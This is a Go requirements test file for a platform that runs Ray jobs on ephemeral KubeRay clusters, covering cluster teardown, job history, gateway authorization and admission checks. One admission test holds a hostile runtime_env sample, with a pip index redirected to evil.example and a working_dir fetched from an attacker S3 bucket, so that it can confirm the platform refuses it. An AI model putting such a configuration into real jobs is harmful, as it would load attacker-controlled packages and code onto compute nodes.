// Requirement 5 — the UI runs jobs on an ephemeral RayJob: a submit creates
// a cluster for the job and removes it when the job finishes. POST
// /api/v1/jobs records the job; the job reconciler applies a KubeRay
// RayJob whose cluster KubeRay creates and (shutdownAfterJobFinishes) tears
// down; while the job runs its cluster is routable through the gateway.
package r05_ephemeral_rayjob

import (
	"context"
	"encoding/json"
	"net/http"
	"testing"

	rayv1 "github.com/ray-project/kuberay/ray-operator/apis/ray/v1"
	apierrors "k8s.io/apimachinery/pkg/api/errors"
	ctrlclient "sigs.k8s.io/controller-runtime/pkg/client"

	"github.com/bifrost-compute/bifrost/pkg/client"
	"github.com/bifrost-compute/bifrost/test/requirements/fixture"
	"github.com/bifrost-compute/bifrost/test/requirements/req"
	"github.com/bifrost-compute/bifrost/test/requirements/target"
)

// quickTTL keeps a finished job's cluster around only briefly, so the
// cluster-removal tests converge inside the lane budget.
func quickTTL() *int32 { v := int32(5); return &v }

const (
	okEntrypoint      = `python -c "print('REQ-JOB-OK')"`
	failingEntrypoint = `python -c "import sys; sys.exit(1)"`
	longEntrypoint    = `python -c "import time; time.sleep(600)"`
)

// waitDeployment waits for the RayJob's deployment status to catch up with a
// job status the view already reports.
//
// KubeRay writes the two on different reconciles: a job reads SUCCEEDED or
// FAILED before the deployment reads Complete or Failed, so asserting both
// from one view is a race. It passed on grace and failed on the kind lane,
// on the success path (run 33829270788) and then the failure path
// (run 33855327123), which is what a race looks like.
func waitDeployment(t *testing.T, tgt req.Target, id, want string) {
	t.Helper()
	req.Eventually(t, tgt, func() (bool, string) {
		st, v := fixture.GetJob(t, tgt, "dev-a", id)
		if st != http.StatusOK {
			return false, "get=" + http.StatusText(st)
		}
		dep, _ := v["deployment_status"].(string)
		return dep == want, "deployment_status=" + dep
	})
}

func TestSubmitCreatesAnEphemeralCluster(t *testing.T) {
	tgt := target.Get(t)
	req.Covers(t, 5, "POST /api/v1/jobs creates a job with its own cluster; the view reports the cluster once it exists")
	id := req.Name("sub")
	view := fixture.MustSubmitJob(t, tgt, "dev-a", fixture.SubmitJobBody(id, "team-a", okEntrypoint, quickTTL()))
	if view["id"] != id || view["project"] != "team-a" {
		t.Fatalf("view = %v", view)
	}
	if _, ok := view["status"].(string); !ok {
		t.Fatalf("view carries no status: %v", view)
	}
	// The job's cluster is created for it: the view names it once the
	// backend has.
	req.Eventually(t, tgt, func() (bool, string) {
		st, v := fixture.GetJob(t, tgt, "dev-a", id)
		if st != http.StatusOK {
			return false, "get=" + http.StatusText(st)
		}
		c, _ := v["cluster"].(string)
		return c != "", "cluster=" + c
	})
}

func TestJobCompletionRemovesItsCluster(t *testing.T) {
	tgt := target.Get(t)
	req.Covers(t, 5, "a job that finishes is SUCCEEDED and the cluster created for it is removed; it never appears among the managed clusters")
	ctx := context.Background()
	id := req.Name("done")
	fixture.MustSubmitJob(t, tgt, "dev-a", fixture.SubmitJobBody(id, "team-a", okEntrypoint, quickTTL()))
	view := fixture.WaitJob(t, tgt, "dev-a", id, "SUCCEEDED")
	waitDeployment(t, tgt, id, "Complete")
	cluster, _ := view["cluster"].(string)
	if cluster == "" {
		t.Fatalf("finished job names no cluster: %v", view)
	}

	// The job's cluster is not a managed cluster: nothing about it is in
	// GET /clusters, under either name.
	resp, err := tgt.As("admin").API().ListClustersWithResponse(ctx)
	if err != nil || resp.StatusCode() != http.StatusOK {
		t.Fatalf("list clusters: %v %v", err, resp.StatusCode())
	}
	for _, cid := range fixture.IDs(resp.Body) {
		if cid == id || cid == cluster {
			t.Fatalf("job cluster %s leaked into the managed cluster list", cid)
		}
	}

	if k, ok := tgt.K8s(); ok {
		req.Eventually(t, tgt, func() (bool, string) {
			var rc rayv1.RayCluster
			err := k.Get(ctx, ctrlclient.ObjectKey{Namespace: tgt.Namespace(), Name: cluster}, &rc)
			if apierrors.IsNotFound(err) {
				return true, "gone"
			}
			if err != nil {
				return false, err.Error()
			}
			return false, "RayCluster " + cluster + " still present"
		})
	}
}

func TestFailedJobIsReportedAndCleanedUp(t *testing.T) {
	tgt := target.Get(t)
	req.Covers(t, 5, "a job whose entrypoint fails is FAILED, carries a message, and its cluster is removed all the same")
	ctx := context.Background()
	id := req.Name("fail")
	fixture.MustSubmitJob(t, tgt, "dev-a", fixture.SubmitJobBody(id, "team-a", failingEntrypoint, quickTTL()))
	view := fixture.WaitJob(t, tgt, "dev-a", id, "FAILED")
	waitDeployment(t, tgt, id, "Failed")
	cluster, _ := view["cluster"].(string)
	if k, ok := tgt.K8s(); ok && cluster != "" {
		req.Eventually(t, tgt, func() (bool, string) {
			var rc rayv1.RayCluster
			err := k.Get(ctx, ctrlclient.ObjectKey{Namespace: tgt.Namespace(), Name: cluster}, &rc)
			if apierrors.IsNotFound(err) {
				return true, "gone"
			}
			return false, "RayCluster " + cluster + " still present"
		})
	}
}

func TestJobAppearsInHistoryWithSubmitter(t *testing.T) {
	tgt := target.Get(t)
	req.Covers(t, 5, "a finished job is recorded in the persistent job history")
	req.Covers(t, 14, "the job history attributes each job to the identity that submitted it")
	ctx := context.Background()
	id := req.Name("hist")
	submitter := fixture.Subject(t, tgt, "dev-a")
	fixture.MustSubmitJob(t, tgt, "dev-a", fixture.SubmitJobBody(id, "team-a", okEntrypoint, quickTTL()))
	fixture.WaitJob(t, tgt, "dev-a", id, "SUCCEEDED")

	type record struct {
		Id           string `json:"id"`
		Cluster      string `json:"cluster"`
		Submitter    string `json:"submitter"`
		Status       string `json:"status"`
		DurationSecs *int64 `json:"duration_secs"`
	}
	req.Eventually(t, tgt, func() (bool, string) {
		resp, err := tgt.As("dev-a").API().ListJobsWithResponse(ctx)
		if err != nil || resp.StatusCode() != http.StatusOK {
			return false, "list jobs not 200"
		}
		var recs []record
		_ = json.Unmarshal(resp.Body, &recs)
		for _, r := range recs {
			if r.Id != id {
				continue
			}
			// The submitter is the identity's subject: "dev-a" on inproc, the
			// seeded username on a cluster target.
			if r.Submitter != submitter || r.Status != "SUCCEEDED" || r.Cluster == "" || r.DurationSecs == nil {
				t.Fatalf("history record = %+v, want submitter %q, SUCCEEDED, a cluster and a duration", r, submitter)
			}
			return true, "recorded"
		}
		return false, "job not in history yet"
	})
}

func TestRunningJobIsReachableThroughTheGateway(t *testing.T) {
	tgt := target.Get(t)
	req.Covers(t, 5, "while a job runs, its cluster's Jobs API is reachable through the authenticated gateway and only by its project")
	req.NeedsCapability(t, tgt, "gateway")
	id := req.Name("gw")
	fixture.MustSubmitJob(t, tgt, "dev-a", fixture.SubmitJobBody(id, "team-a", longEntrypoint, quickTTL()))
	fixture.WaitJob(t, tgt, "dev-a", id, "RUNNING")

	var host string
	req.Eventually(t, tgt, func() (bool, string) {
		_, v := fixture.GetJob(t, tgt, "dev-a", id)
		host = fixture.GatewayHost(v)
		return host != "", "gateway_url not set yet"
	})

	if st, _ := fixture.GatewayRequest(t, tgt, "anon", host, "/api/jobs/"); st != http.StatusUnauthorized {
		t.Fatalf("anonymous via gateway = %d, want 401", st)
	}
	if st, _ := fixture.GatewayRequest(t, tgt, "dev-b", host, "/api/jobs/"); st != http.StatusForbidden {
		t.Fatalf("other project's developer via gateway = %d, want 403", st)
	}
	if _, ok := tgt.K8s(); ok {
		// Only a real cluster has a head behind the entry; inproc's fake
		// dashboard address resolves nowhere.
		req.Eventually(t, tgt, func() (bool, string) {
			st, body := fixture.GatewayRequest(t, tgt, "dev-a", host, "/api/jobs/")
			return st == http.StatusOK, http.StatusText(st) + " " + string(body)
		})
	}
}

// Requirement 12 meets requirement 5: a job may name catalogued storage and
// gets it the same way a cluster does — as a Secret reference on its pods,
// never as a value through the API. An unknown name is refused before
// anything is created.
func TestJobStorageReferenceIsResolvedLikeAClusters(t *testing.T) {
	tgt := target.Get(t)
	req.Covers(t, 12, "an ephemeral job may reference catalogued storage; unknown names are 400 and nothing is submitted")
	ctx := context.Background()
	id := req.Name("jst")
	body := fixture.SubmitJobBody(id, "team-a", "python -c 1", nil)
	names := []string{"no-such-storage-" + req.RunID()}
	body.Spec.Storage = &names
	resp, err := tgt.As("dev-a").API().SubmitJobWithResponse(ctx, body)
	if err != nil {
		t.Fatal(err)
	}
	if resp.StatusCode() != http.StatusBadRequest {
		t.Fatalf("submit with unknown storage = %d %s, want 400", resp.StatusCode(), resp.Body)
	}
	if g, err := tgt.As("admin").API().GetJobWithResponse(ctx, id); err != nil || g.StatusCode() != http.StatusNotFound {
		t.Fatalf("a refused submit must persist nothing; get_job = %v", codeOf(g))
	}
}

func codeOf(r interface{ StatusCode() int }) any {
	if r == nil {
		return nil
	}
	return r.StatusCode()
}

// runtime_env governance (issue #53): a runtime_env_yaml carrying the
// supply-chain shapes the epic identified — an index redirect, a remote
// working_dir fetched with node credentials — is refused at admission with
// a 400 and no job is persisted; a governed document (pinned pip, local
// uploads, capped setup timeout) is admitted.
func TestJobRuntimeEnvIsGovernedAtAdmission(t *testing.T) {
	tgt := target.Get(t)
	req.Covers(t, 5, "a job's runtime_env_yaml is validated against the platform governance rules at admission: index redirection and remote working_dir URIs are 400 and nothing is submitted")
	ctx := context.Background()

	refused := fixture.SubmitJobBody(req.Name("evil"), "team-a", okEntrypoint, quickTTL())
	evil := "pip:\n  packages: [torch]\n  pip_install_options: [--index-url, https://evil.example/simple]\nworking_dir: s3://attacker/code.zip"
	refused.Spec.RuntimeEnvYaml = &evil
	resp, err := tgt.As("dev-a").API().SubmitJobWithResponse(ctx, refused)
	if err != nil {
		t.Fatal(err)
	}
	if resp.StatusCode() != http.StatusBadRequest {
		t.Fatalf("submit with ungoverned runtime_env = %d %s, want 400", resp.StatusCode(), resp.Body)
	}
	if g, gerr := tgt.As("admin").API().GetJobWithResponse(ctx, *refused.Id); gerr != nil || g.StatusCode() != http.StatusNotFound {
		t.Fatalf("a refused submit must persist nothing; get_job = %v", codeOf(g))
	}

	// No pip entries: the admitted document must not depend on a package
	// install reaching an index, so the probe stays green on default-deny
	// egress lanes.
	legal := fixture.SubmitJobBody(req.Name("ok"), "team-a", okEntrypoint, quickTTL())
	env := "env_vars:\n  REQ_PROBE: governed\nconfig:\n  setup_timeout_seconds: 300"
	legal.Spec.RuntimeEnvYaml = &env
	fixture.MustSubmitJob(t, tgt, "dev-a", legal)
}

// Environment resolution at admission (#55): a job may name a published
// environment from the governed catalog and runs with its compiled
// runtime_env; an unknown name and a hand-written runtime_env_yaml next to
// a named environment (whole-or-nothing) are 400 and nothing is submitted.
// The environment carries no pip packages: the admitted job must not
// pip-install on default-deny egress lanes.
func TestJobEnvironmentIsResolvedAtAdmission(t *testing.T) {
	tgt := target.Get(t)
	req.Covers(t, 5, "a job may name a published environment; unknown names and environment+runtime_env_yaml conflicts are 400 and nothing is submitted")
	ctx := context.Background()
	admin := tgt.As("admin").API()

	before, err := admin.GetPolicyWithResponse(ctx)
	if err != nil || before.JSON200 == nil {
		t.Fatalf("get_policy: err=%v status=%v body=%s", err, before.StatusCode(), before.Body)
	}
	envName := req.Name("jenv")
	envImage := fixture.RayImage()
	envStatus := client.Published
	envs := []client.EnvironmentSpec{{
		Name:      envName,
		BaseImage: &envImage,
		EnvVars:   &map[string]string{"REQ_PROBE": "environment"},
		Status:    &envStatus,
	}}
	put, err := admin.UpdatePolicyWithResponse(ctx, client.UpdatePolicyJSONRequestBody{Environments: &envs})
	if err != nil || put.StatusCode()/100 != 2 {
		t.Fatalf("update_policy environments: err=%v status=%v body=%s", err, put.StatusCode(), put.Body)
	}
	t.Cleanup(func() {
		restore := []client.EnvironmentSpec{}
		if before.JSON200.Environments != nil {
			restore = *before.JSON200.Environments
		}
		_, _ = admin.UpdatePolicyWithResponse(context.Background(), client.UpdatePolicyJSONRequestBody{Environments: &restore})
	})

	// The happy path: a published environment naming the canonical image
	// resolves and the job is admitted.
	okBody := fixture.SubmitJobBody(req.Name("jok"), "team-a", okEntrypoint, quickTTL())
	okBody.Spec.Environment = &envName
	fixture.MustSubmitJob(t, tgt, "dev-a", okBody)

	// An unknown name is a 400 and persists nothing.
	unknown := fixture.SubmitJobBody(req.Name("jno"), "team-a", okEntrypoint, quickTTL())
	unknownName := req.Name("nosuchenv")
	unknown.Spec.Environment = &unknownName
	resp, err := tgt.As("dev-a").API().SubmitJobWithResponse(ctx, unknown)
	if err != nil {
		t.Fatal(err)
	}
	if resp.StatusCode() != http.StatusBadRequest {
		t.Fatalf("submit with unknown environment = %d %s, want 400", resp.StatusCode(), resp.Body)
	}
	if g, gerr := tgt.As("admin").API().GetJobWithResponse(ctx, *unknown.Id); gerr != nil || g.StatusCode() != http.StatusNotFound {
		t.Fatalf("a refused submit must persist nothing; get_job = %v", codeOf(g))
	}

	// Whole-or-nothing: environment and a hand-written runtime_env_yaml in
	// the same request are a 400.
	both := fixture.SubmitJobBody(req.Name("jb2"), "team-a", okEntrypoint, quickTTL())
	both.Spec.Environment = &envName
	handwritten := "env_vars:\n  REQ_PROBE: hand-written"
	both.Spec.RuntimeEnvYaml = &handwritten
	resp, err = tgt.As("dev-a").API().SubmitJobWithResponse(ctx, both)
	if err != nil {
		t.Fatal(err)
	}
	if resp.StatusCode() != http.StatusBadRequest {
		t.Fatalf("submit with environment + runtime_env_yaml = %d %s, want 400", resp.StatusCode(), resp.Body)
	}
}
